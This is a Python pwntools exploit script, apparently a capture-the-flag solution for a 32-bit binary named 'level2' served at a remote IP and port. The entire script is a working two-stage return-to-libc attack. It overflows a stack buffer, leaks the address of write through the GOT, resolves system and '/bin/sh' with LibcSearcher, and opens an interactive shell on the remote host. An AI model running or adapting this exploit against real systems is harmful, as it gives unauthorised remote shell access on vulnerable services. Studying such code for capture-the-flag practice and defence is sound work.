from pwn import *
from LibcSearcher import LibcSearcher
context(arch='i386',os='linux',log_level='debug')
io=remote('111.200.241.244',51694)
elf=ELF('./level2')
#r=process('./level2')
write_plt=elf.plt['write']
log.info(hex(write_plt))
write_got=elf.got['write']
log.info(hex(write_got))
main_addr=elf.symbols['main']
log.info(hex(main_addr))

sys_addr=0x08048320
binsh_addr=0x0804A024
ret=0x080482de
payload1='A'*0x88+'B'*0x4+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)
io.sendline(payload1)
write_addr=u32(io.recv(4))
log.info(hex(write_addr))
libc=LibcSearcher('write',write_addr)
base_addr=write_addr-libc.dump('write')
sys_addr=base_addr+libc.dump('system')
bin_addr=base_addr+libc.dump('str_bin_sh')
payload2='A'*0x88+'B'*0x4+p32(sys_addr)+p32(0)+p32(bin_addr)
io.sendline(payload2)
io.interactive()

